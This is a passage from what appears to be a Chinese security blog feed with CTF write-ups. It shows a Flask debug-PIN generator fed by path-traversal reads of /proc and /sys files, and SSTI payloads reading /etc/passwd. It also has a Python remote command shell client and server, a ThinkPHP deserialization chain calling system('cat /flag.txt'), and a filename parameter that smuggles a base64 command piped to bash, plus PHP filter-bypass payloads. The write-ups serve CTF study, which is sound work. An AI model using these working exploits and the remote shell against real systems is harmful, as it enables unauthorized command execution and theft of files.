<p><img src="/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111130049191.png" alt="image-20211111130049191"></p>
<p>root和ctf可用</p>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/sys/class/net/eth0/address</code></pre>
<p>02:d9:d4:24:40:16</p>
<p>转换为十进制</p>
<p>3134590304278</p>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/proc/self/cgroup</code></pre>
<p><img src="/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111130245290.png" alt="image-20211111130245290"></p>
<pre><code>9c53f2ee41ea353b18b583926197cd776487bfab3058a8f319734dc65e71d302</code></pre>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/proc/sys/kernel/random/boot_id</code></pre>
<pre><code>012c0db1-a401-4a82-b781-03d7681c398e</code></pre>
<p>信息：</p>
<pre class=" language-python"><code class="language-python">list <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#当前用户，通过读取/etc/passwd获取 </span>
        <span class="token string">'flask.app'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#一般情况为固定值     </span>
        <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#一般情况为固定值 </span>
         <span class="token string">'/usr/local/lib/python2.7/dist-packages/flask/app.py'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#flask目录下的一个app.py的绝对路径，通过debug错误页面获取 </span>
         <span class="token string">'2583524700623'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址 如果不是映射端口 可以通过arp ip命令获取 </span>
         <span class="token string">'19ef9f241e480f2bca3437d27505a657eda03c05014023382e1b00667d4c82ad'</span><span class="token comment" spellcheck="true">#机器名，通过读取/proc/self/cgroup或/proc/sys/kernel/random/boot_id 或/etc/machine-id获取 ]</span>
</code></pre>
<p>生成PIN：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'root'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># username</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># modname</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
    <span class="token string">'/usr/local/lib/python2.7/dist-packages/flask/app.py'</span> <span class="token comment" spellcheck="true"># getattr(mod, '__file__', None),</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'3134590304278'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
    <span class="token string">'9c53f2ee41ea353b18b583926197cd776487bfab3058a8f319734dc65e71d302'</span><span class="token comment" spellcheck="true"># , /proc/self/cgroup</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>bit<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> None
<span class="token keyword">if</span> num <span class="token keyword">is</span> None<span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> int<span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span>None
<span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span>
</code></pre>
<p>336-610-602输入到/console中即可命令执行</p>
<p>也可以直接目录穿越获取flag</p>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/flag.txt</code></pre>
<h1 id="GYCTF2020：FlaskApp"><a href="#GYCTF2020：FlaskApp" class="headerlink" title="GYCTF2020：FlaskApp"></a>GYCTF2020：FlaskApp</h1><p>常规的SSTI解法之前写过了</p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/proc/self/cgroup'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
<p>脚本：</p>
<pre class=" language-Python"><code class="language-Python">import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485377957894',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
</code></pre>
<h1 id="链接参考："><a href="#链接参考：" class="headerlink" title="链接参考："></a>链接参考：</h1><p><a href="https://blog.csdn.net/weixin_44604541/article/details/109147735">https://blog.csdn.net/weixin_44604541/article/details/109147735</a></p>
<p><a href="https://www.cnblogs.com/HacTF/p/8160076.html">https://www.cnblogs.com/HacTF/p/8160076.html</a></p>
<p><a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p>
]]></content>
      <tags>
        <tag>Pythonsec</tag>
      </tags>
  </entry>
  <entry>
    <title>python shell与反弹shell</title>
    <url>/2021/08/08/pythonsec/python-shell-yu-fan-dan-shell/python-shell-yu-fan-dan-shell/</url>
    <content><![CDATA[<p>正常shell需要先在攻击端开机情况下开启程序,然后攻击端运行程序,才能连接</p>
<p>反弹shell,攻击端是服务端,被攻击端是客户端<br>正常shell,攻击端是客户端,被攻击端是服务端 </p>
<p>反弹shell,先启用服务端,再启用客户端</p>
<p>反弹shell的好处就是:一旦被攻击端开机,立即连接上攻击端(需要攻击端一直运行)</p>
<h3 id="shell："><a href="#shell：" class="headerlink" title="shell："></a>shell：</h3><h4 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket
s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"XX.XX.XX.XX"</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#连接的服务器的ip地址,端口</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    com<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"command:"</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>com<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#发送信息</span>
    d<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">#接受数据的大小</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<h4 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> os
s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span>

s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定地址和端口#0.0.0.0接收任意客户端ip连接</span>
s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">#调用listen方法开始监听端口，传入的参数为等待连接的最大数量</span>
con<span class="token punctuation">,</span>addr<span class="token operator">=</span>s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#接受一个客户端的连接</span>
<span class="token comment" spellcheck="true">#print(con,addr)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cmd<span class="token operator">=</span>con<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
    command<span class="token operator">=</span>cmd<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> command<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"cd"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>command<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#切换路径</span>
        result<span class="token operator">=</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#显示路径</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        result<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> result<span class="token punctuation">:</span>
        con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">"OK!"</span><span class="token punctuation">)</span></code></pre>
]]></content>
      <tags>
        <tag>Pythonsec</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2022Writeup</title>
    <url>/2022/06/01/writeup/ciscn2022writeup/ciscn2022writeup/</url>
    <content><![CDATA[<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p><a href="https://www.freebuf.com/vuls/321546.html">https://www.freebuf.com/vuls/321546.html</a></p>
<p>入口/index.php/Index/test/</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">{</span>
    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span> <span class="token operator">=</span> True<span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'whoami'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">'cat /flag.txt'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">=</span> True<span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'whoami'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> True<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">{</span>
    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h2 id="online-crt"><a href="#online-crt" class="headerlink" title="online_crt"></a>online_crt</h2><p>查看app.py下三个路由</p>
<p><img src="/2022/06/01/writeup/ciscn2022writeup/ciscn2022writeup/image-20220601110938302.png" alt="image-20220601110938302"></p>
<p>查看go源代码</p>
<p><img src="/2022/06/01/writeup/ciscn2022writeup/ciscn2022writeup/image-20220601111006298.png" alt="image-20220601111006298"></p>
<p>将旧的crt改为新的crt</p>
<p>最后echo出来</p>
<p><img src="/2022/06/01/writeup/ciscn2022writeup/ciscn2022writeup/image-20220601112736207.png" alt="image-20220601112736207"></p>
<pre><code>/admin%2frename?oldname=c2277275-5f88-424c-a29b-5dc09a6ead46.crt&amp;newname=ca'a.crt%22%7
Cecho%20Y2F0IC4uLy4uLy4uL2ZsYWcgICA%2BYmIudHh0%7Cbase64%20-d%7Cbash%22 HTTP/1.1
Host: admin
Cookie: bbb

</code></pre>
<p>访问这个</p>
<p><img src="/2022/06/01/writeup/ciscn2022writeup/ciscn2022writeup/image-20220601112757565.png" alt="image-20220601112757565"></p>
<p>最后去访问这个由crt带出来的txt</p>
<p><img src="/2022/06/01/writeup/ciscn2022writeup/ciscn2022writeup/image-20220601112807381.png" alt="image-20220601112807381"></p>
]]></content>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>鹤城杯2021Writeup</title>
    <url>/2021/10/08/writeup/he-cheng-bei-2021writeup/he-cheng-bei-2021writeup/</url>
    <content><![CDATA[<h1 id="MIDDLE-MAGIC"><a href="#MIDDLE-MAGIC" class="headerlink" title="MIDDLE_MAGIC"></a>MIDDLE_MAGIC</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token string">"./flag.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token string">"./result.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

        <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/^(.*)level(.*)$/'</span><span class="token punctuation">,</span> <span class="token string">'${1}&lt;!-- filtered -->${2}'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/pass_the_level_1#/'</span><span class="token punctuation">,</span> <span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"here is level 2"</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                    <span class="token keyword">echo</span> <span class="token string">'&lt;p>The level 2 can not pass!&lt;/p>'</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">// START FORM PROCESSING    </span>
                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                    <span class="token keyword">echo</span> <span class="token string">"here is level 3,do you kown how to overcome it?"</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token variable">$level_3</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$level_3</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">result</span> <span class="token operator">==</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                            <span class="token keyword">echo</span> <span class="token string">"success:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                        <span class="token keyword">else</span> <span class="token punctuation">{</span>
                            <span class="token keyword">echo</span> <span class="token string">"you never beat me!"</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">else</span><span class="token punctuation">{</span>
                        <span class="token keyword">echo</span> <span class="token string">"out"</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">else</span><span class="token punctuation">{</span>

                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token comment" spellcheck="true">// perform validations on the form data</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string">'&lt;p>out!&lt;/p>'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span>

        <span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">'nonono!'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">echo</span> <span class="token string">'&lt;hr>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token delimiter">?></span> </code></pre>
<ul>
<li>%0a绕过preg_replace</li>
<li>数组绕过sha1</li>
<li>若比较=0绕过json_decode</li>
</ul>
<p><strong>payload</strong></p>
<pre><code>?aaa=%0apass_the_level_1#
POST:
admin[]=1&amp;root_pwd[]=2&amp;level_3={"result":0}</code></pre>
<h1 id="EASYP"><a href="#EASYP" class="headerlink" title="EASYP"></a>EASYP</h1><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'utils.php'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$guess</span> <span class="token operator">===</span> <span class="token variable">$secret</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string">'Wrong. Try Again'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

